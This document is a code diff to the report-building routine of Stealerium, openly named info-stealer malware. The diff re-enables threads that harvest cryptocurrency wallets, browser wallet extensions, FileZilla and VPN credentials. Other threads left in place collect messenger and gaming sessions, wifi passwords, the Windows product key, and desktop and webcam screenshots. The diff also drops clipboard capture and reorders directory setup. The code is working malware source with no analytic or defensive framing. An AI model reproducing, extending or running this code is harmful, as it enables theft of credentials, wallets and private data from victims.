@@ -15,6 +15,7 @@ namespace Stealerium.Helpers
     {
         public static bool CreateReport(string sSavePath)
         {
+            Logging.Log("Starting Making Report >>");
             // List with threads
             var threads = new List<Thread>();
             try
@@ -82,8 +83,7 @@ namespace Stealerium.Helpers
                 threads.Add(new Thread(() =>
                     Icq.GetSession(sSavePath + "\\Messenger\\ICQ")
                 ));
-                // Create directory to save system information
-                Directory.CreateDirectory(sSavePath + "\\System");
+                
 
                 
                 // Steam & Uplay sessions collection
@@ -101,24 +101,24 @@ namespace Stealerium.Helpers
                 threads.Add(new Thread(() =>
                     Minecraft.SaveAll(sSavePath + "\\Gaming\\Minecraft")
                 ));
-                /*
+                
                 // Write wallets
                 threads.Add(new Thread(() =>
                     Wallets.GetWallets(sSavePath + "\\Wallets")
                 ));
-
+                
                 // Write Browser Wallets
                 threads.Add(new Thread(() =>
                 {
                     Target.Browsers.Chromium.Extensions.GetChromeWallets(sSavePath + "\\Wallets\\Chrome_Wallet");
                     Target.Browsers.Edge.Extensions.GetEdgeWallets(sSavePath + "\\Wallets\\Edge_Wallet");
                 }));
-
+                
                 // Write FileZilla
                 threads.Add(new Thread(() =>
                     FileZilla.WritePasswords(sSavePath + "\\FileZilla")
                 ));
-
+                
                 // Write VPNs
                 threads.Add(new Thread(() =>
                 {
@@ -127,6 +127,7 @@ namespace Stealerium.Helpers
                     NordVpn.Save(sSavePath + "\\VPN\\NordVPN");
                 }));
 
+                
                 // Get directories list
                 threads.Add(new Thread(() =>
                 {
@@ -134,8 +135,9 @@ namespace Stealerium.Helpers
                     DirectoryTree.SaveDirectories(sSavePath + "\\Directories");
                 }));
 
-               
-
+                // Create directory to save system information
+                Directory.CreateDirectory(sSavePath + "\\System");
+                
                 // Process list & active windows list
                 threads.Add(new Thread(() =>
                 {
@@ -145,6 +147,7 @@ namespace Stealerium.Helpers
                     ActiveWindows.WriteWindows(sSavePath + "\\System");
                 }));
 
+                
                 // Desktop & Webcam screenshot
                 var dwThread = new Thread(() =>
                 {
@@ -153,9 +156,9 @@ namespace Stealerium.Helpers
                     // Create webcam screenshot
                     WebcamScreenshot.Make(sSavePath + "\\System");
                 });
-                dwThread.SetApartmentState(ApartmentState.STA);
+                //dwThread.SetApartmentState(ApartmentState.STA);
                 threads.Add(dwThread);
-
+                
                 // Saved wifi passwords
                 threads.Add(new Thread(() =>
                     {
@@ -165,27 +168,23 @@ namespace Stealerium.Helpers
                         Wifi.ScanningNetworks(sSavePath + "\\System");
                     }
                 ));
+                
                 // Windows product key
                 threads.Add(new Thread(() =>
                     // Write product key
                     File.WriteAllText(sSavePath + "\\System\\ProductKey.txt",
                         ProductKey.GetWindowsProductKeyFromRegistry())
                 ));
-                
-                // Clipboard text
-                threads.Add(new Thread(() =>
-                    File.WriteAllText(sSavePath + "\\System\\Clipboard.txt",
-                        Clipboard.GetText())
-                ));
+                /*
+                //Dem Not Required this reature, and this feature take logn time mostly
                 // Get installed apps
                 threads.Add(new Thread(() =>
                     InstalledApps.WriteAppsList(sSavePath + "\\System")
                 ));
                 */
-
                 // Debug logs
                 threads.Add(new Thread(() =>
-                    Logging.Save(sSavePath + "\\System\\Debug.txt")
+                    Logging.Save(sSavePath + "\\Log.txt")
                 ));
                 // System info
                 threads.Add(new Thread(() =>
@@ -196,8 +195,8 @@ namespace Stealerium.Helpers
                 {
                     t.Start(); t.Join();
                 }
-
-                return Logging.Log("Report created");
+                Logging.Log("Report created >> ");
+                return true;
             }
             catch (Exception ex)
             {
